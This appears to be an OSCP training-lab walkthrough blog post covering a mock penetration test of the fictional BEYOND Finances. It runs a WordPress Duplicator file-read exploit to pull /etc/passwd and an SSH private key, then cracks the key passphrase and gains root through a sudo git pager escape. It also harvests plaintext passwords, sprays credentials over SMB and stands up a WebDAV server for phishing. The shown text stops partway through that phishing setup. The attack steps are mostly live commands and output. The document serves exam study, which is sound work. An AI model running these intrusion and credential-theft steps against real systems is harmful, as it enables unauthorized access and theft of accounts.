---
title: Assembling the Pieces
date: 2024-04-024 06:29:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Assembling the Pieces tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Assembling the Pieces (Chellenge Lab 0)

In this scenario, the company BEYOND Finances has tasked us with conducting a penetration test of their IT infrastructure. The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal Active Directory (AD) environment. In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller.

```
WEBSRV1 192.168.155.244
MAILSRV1 192.168.155.242
```

Make a workspace for this test.

```console
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```

## Enumerating the Public Network


### MAILSRV1

```console
$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.155.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 16:21 EDT
Nmap scan report for 192.168.155.242
Host is up (0.054s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd                  // !!
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0           // !!
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC               // !!
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: NAMESPACE IDLE OK IMAP4rev1 RIGHTS=texkA0001 IMAP4 QUOTA completed CAPABILITY CHILDREN SORT ACL
445/tcp open  microsoft-ds?                                     // !!
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7s
| smb2-time: 
|   date: 2024-04-27T20:22:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.83 seconds
```

Based on this information, we can establish that the target machine is a Windows system running an IIS web server and a hMailServer.

We can research applications we don't know (like hMailServer) by browsing the application's web page.

To identify potential vulnerabilities in hMailServer, we can use a search engine to find CVEs and public exploits. However, as Nmap didn't discover a version number, we have to conduct a broader search. Unfortunately, the search didn't provide any meaningful results apart from some older CVEs.

Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.

Next, browse to the web page of the IIS web server. (192.168.155.242:80 in browser). 

Try to identify directories and files by using gobuster.

```console
$ gobuster dir -u http://192.168.155.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

Gobuster did not identify any pages, files, or directories.

We cannot use the mail server at this moment. If we identify valid credentials and targets later on in the penetration test, we could perhaps use the mail server to send a phishing email, for example.

### WEBSRV1

Enumerate the second target machine from the client's topology, WEBSRV1.

```console
$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.155.244
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 16:31 EDT
Nmap scan report for 192.168.155.244
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)     // !!
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))                          // !!
|_http-generator: WordPress 6.0.2
| http-title: BEYOND Finances &#8211; We provide financial freedom           // !!
|_Requested resource was http://192.168.155.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```

The Nmap scan revealed only two open ports: 22 and 80.

Nmap fingerprinted the services as running an SSH service and HTTP service on the ports, respectively. the target is running on an Ubuntu Linux system. However, the banner provides much more detail with a bit of manual work. Let's copy the "OpenSSH 8.9p1 Ubuntu 3" string in to a search engine. The results contain a link to the Ubuntu Launchpad web page, which contains a list of OpenSSH version information mapped to specific Ubuntu releases. In our example, the version is mapped to Jammy Jellyfish, which is the version name for Ubuntu 22.04.

For port 22, we currently only have the option to perform a password attack. Because we don't have any username or password information, we should analyze other services first. Therefore, let's enumerate port 80 running Apache 2.4.52.

NOTE: We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we'll skip it.

Browse to the webpaage (192.168.155.244:80). Because the Nmap scan provided the HTTP title BEYOND Finances, our chances of encountering a non-default page again are high.

If we review the web site, we'll notice it doesn't contain a menu bar or links to other pages. Let’s inspect the web page’s source code to determine the technology being used by right-clicking in our browser on Kali and selecting View Page Source. For a majority of frameworks and web solutions, such as CMS's, we can find artifacts and string indicators in the source code. We notice that the links contain the strings "wp-content" and "wp-includes". By entering these keywords in a search engine, we can establish that the page uses WordPress. To confirm this and potentially provide more information about the technology stack in use, we can use whatweb.

```console
$ whatweb http://192.168.155.244

http://192.168.155.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.155.244], RedirectLocation[http://192.168.155.244/main/], UncommonHeaders[x-redirect-by]                 
http://192.168.155.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.155.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]                                                                    
```

A review of the release history for WordPress indicates this version was released in August 2022 and at the time of writing this Module, it's the most current version. However, WordPress themes and plugins are written by the community and many vulnerabilities are improperly patched or are simply never fixed at all. This makes plugins and themes a great target for compromise. Scan with WPScan.

WPScan looks up component vulnerabilities in the WordPress Vulnerability Database,5 which requires an API token. A limited API key can be obtained for free by registering an account on the WPScan homepage.

```console
// use api token if you have it
$ wpscan --url http://192.168.155.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

$ cat websrv1/wpscan
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.155.244/wp-content/plugins/akismet/
 | Latest Version: 5.3.1
 | Last Updated: 2024-01-17T22:32:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.     // !!

[+] classic-editor
 | Location: http://192.168.155.244/wp-content/plugins/classic-editor/
 | Last Updated: 2023-11-09T16:38:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/classic-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.6.3         // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/classic-editor/, status: 403
 |
 | Version: 1.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/classic-editor/readme.txt

[+] contact-form-7
 | Location: http://192.168.155.244/wp-content/plugins/contact-form-7/
 | Last Updated: 2024-02-05T04:49:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 5.8.7        // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/, status: 403
 |
 | Version: 5.6.3 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/contact-form-7/readme.txt

[+] duplicator
 | Location: http://192.168.155.244/wp-content/plugins/duplicator/
 | Last Updated: 2024-02-06T17:24:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.8.1           // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.155.244/wp-content/plugins/elementor/
 | Last Updated: 2024-02-07T15:41:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.19.2    // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/elementor/, status: 403
 |
 | Version: 3.7.7 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.155.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.155.244/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.155.244/wp-content/plugins/elementor/readme.txt

[+] wordpress-seo
 | Location: http://192.168.155.244/wp-content/plugins/wordpress-seo/
 | Last Updated: 2024-02-06T08:57:00.000Z
 | Readme: http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
 | [!] The version is out of date, the latest version is 22.0     // !!
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/, status: 200
 |
 | Version: 19.7.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.155.244/wp-content/plugins/wordpress-seo/readme.txt
```

Listing 6 shows that WPScan discovered six active plugins in the target WordPress instance: akismet, classic-editor, contact-form-7, duplicator, elementor, and wordpress-seo, some of which are out of date.

Instead of using WPScan's vulnerability database, let's use searchsploit to find possible exploits for vulnerabilities in the installed plugins.

```console
$ searchsploit duplicator

-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                          | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery             | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                                    | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                                   | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                    | php/webapps/50420.py        // !!
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)       | php/webapps/49288.rb        // !!
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                         | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                                  | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery             | php/webapps/40908.html
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The output shows that there are two exploits matching the version of the Duplicator plugin on WEBSRV1. One is tagged with Metasploit, indicating that this exploit was developed for The Metasploit Framework.

## Attacking a Public Machine

### Initial Foothold

```console
$ searchsploit -x 50420

# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]
```

The Python code exploits the vulnerability tracked as CVE-2020-11738.

```console
$ cd websrv1

$ searchsploit -m 50420
Copied to: /home/kali/beyond/websrv1/50420.py

$ python3 50420.py http://192.168.155.244 /etc/passwd
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```

Add the creds for the user accounts to creds.txt.

There are several files we can attempt to retrieve via Directory Traversal in order to obtain access to a system. One of the most common methods is to retrieve an SSH private key configured with permissions that are too open.

```console
// try marcus
$ python3 50420.py http://192.168.155.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

// try daniela
$ python3 50420.py http://192.168.155.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

$ nano id_rsa
// copy daniela's key in this file

$ chmod 600 id_rsa

$ ssh -i id_rsa daniela@192.168.155.244
Enter passphrase for key 'id_rsa': 
```

The SSH key is protected by a passphrase... Try to crack it.

```console
$ ssh2john id_rsa > ssh.hash

$ john --wordlist=/home/kali/Desktop/oscp/rockyou.txt ssh.hash
tequieromucho    (id_rsa)     

$ ssh -i id_rsa daniela@192.168.155.244
Enter passphrase for key 'id_rsa':  tequieromucho

daniela@websrv1:~$ 
```

Add the password that you cracked to creds.txt!!!

We have access to our first target.

### A Link to the Past

Let's use the linPEAS automated Linux enumeration script to obtain a broad variety of information and identify any potential low hanging fruit.

```console
kali/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .

kali/beyond/websrv1$ python3 -m http.server 80

// use kali ip in below cmd

daniela@websrv1:~$ wget http://192.168.45.158/linpeas.sh
--2024-04-27 21:06:35--  http://192.168.45.158/linpeas.sh
Connecting to 192.168.45.158:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 853290 (833K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[=====================================================>] 833.29K  2.42MB/s    in 0.3s    

2024-04-27 21:06:35 (2.42 MB/s) - ‘linpeas.sh’ saved [853290/853290]

// make executable

daniela@websrv1:~$ chmod a+x ./linpeas.sh

daniela@websrv1:~$ ./linpeas.sh
```

Let's review the results.

System Information:

```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            
Linux version 5.15.0-50-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

Interfaces:

```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                           
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:80:a3 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.155.244/24 brd 192.168.155.255 scope global ens192
       valid_lft forever preferred_lft forever
```

The above shows only one network interface apart from the loopback interface. This means that the target machine is not connected to the internal network and we cannot use it as a pivot point.

Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we have to discover sensitive information, such as credentials, to get a foothold in the internal network. To obtain files and data from other users and the system, we'll make elevating our privileges our priority.

Sudo:

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
Matching Defaults entries for daniela on websrv1:                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```

Daniela can run /usr/bin/git with sudo privileges without entering a password.

Finish reviewing the linPEAS results before we leverage that finding.

WordPress Files:

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                             
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

Save this password to creds.txt.

Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/. The WordPress instance is not installed in /var/www/html where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.

GitHub Files:

```
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                              
drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git

```

We can assume that Git is used as the version control system for the WordPress instance. Reviewing the commits of the Git repository may allow us to identify changes in configuration data and sensitive information such as passwords.

The directory is owned by root and is not readable by other users. However, we can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information.

For now, let's skip the rest of the linPEAS output and summarize what information and potential privilege escalation vectors we've gathered so far.


WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The sudoers file contains an entry allowing daniela to run /usr/bin/git with elevated privileges without providing a password. In addition, we learned that the WordPress directory is a Git repository. Finally, we obtained a clear-text password in the database connection settings for WordPress.

Based on this information we can define three potential privilege escalation vectors:

    1. Abuse sudo command /usr/bin/git
    2. Use sudo to search the Git repository
    3. Attempt to access other users with the WordPress database password

The most promising vector at the moment is to abuse the sudo command /usr/bin/git because we don't have to enter a password. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges.

To find potential abuses when a binary such as git is allowed to run with sudo, we can consult [GTFOBins](https://gtfobins.github.io/). Search for git. Find the git > Sudo secition. Try the first two.

```console
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER

daniela@websrv1:~$ sudo git -p help config

// to execute code through the pager, we can enter ! followed by a command or path to an executable file.

!/bin/bash
root@websrv1:/home/daniela#  whoami
root
```

We escalated our privileges.

Armed with root privileges, we'll continue enumerating the system. Before doing so, let's search the Git repository for sensitive information first.

```console
root@websrv1:/home/daniela# cd /srv/www/wordpress/

root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean

root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
```

One is labeled as initial commit and one as Removed staging script and internal network access. That's quite interesting as it indicates that the machine previously had access to the internal network. Use git show, which shows differences between commits.

```console
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1

root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644    // !!
index 25667c7..0000000
--- a/fetch_current.sh      // !!
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash                // !!
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/  // !!
```

New creds! Add them to creds.txt.

NOTE: In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as daniela.

## Gaining Access to the Internal Network

*Note that the third octet of these IPs has changed but we are referring to the same set of machines.*

```
192.168.167.242 MAILSRV1
192.168.167.244 WEBSRV1
```

### Domain Credentials

```console
$ cat creds.txt
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)

Other identified users:
marcus
```

Create a list of usernames. We will omit the wordpress one since it is not a real user, just used for the db connection of the WP instance on WEBSRV1.

Also create a list of passwords.

```console
$ cat usernames.txt     
marcus
john
daniela

$ cat passwords.txt 
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

Use crackmapexec to check the creds against SMB on MAILSRV1.

```console
$ crackmapexec smb 192.168.167.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.167.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL      // !!
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.167.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```

We identified valid creds for john on MAILSRV1! These were the creds we found on WEBSERVER1. Note that john could have changed their password in the meantime.

The output shows another great CrackMapExec feature: it identified the domain name and added it to the usernames. This means that MAILSRV1 is a **domain-joined machine** and we have identified a valid set of **domain credentials**.

This provides us with two options. We can further enumerate SMB on MAILSRV1 and check for sensitive information on accessible shares or we can prepare a malicious attachment and send a phishing email as john to daniela and marcus.

Let's choose option one first and leverage CrackMapExec to list the SMB shares and their permissions on MAILSRV1.

```console
$ crackmapexec smb 192.168.167.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.167.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.167.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.167.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.167.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.167.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.167.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.167.242 445    MAILSRV1         C$                              Default share
SMB         192.168.167.242 445    MAILSRV1         IPC$            READ            Remote IPC
```

CrackMapExec only identified the default shares on which we have no actionable permissions. At this point, we only have the second option left: phishing.

### Phishing for Access

We can choose Microsoft Office documents containing Macros or Windows Library files in combination with shortcut files.

Because we don't have any information about the internal machines or infrastructure, we'll choose the second. Office may not be installed!

```console
// setup webdav server

$ mkdir /home/kali/beyond/webdav

$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
10:01:42.097 - INFO    : Serving on http://0.0.0.0:80 ...
```

We've been given WINPREP as offsec:lab to prepare the Windows files we need.

```console
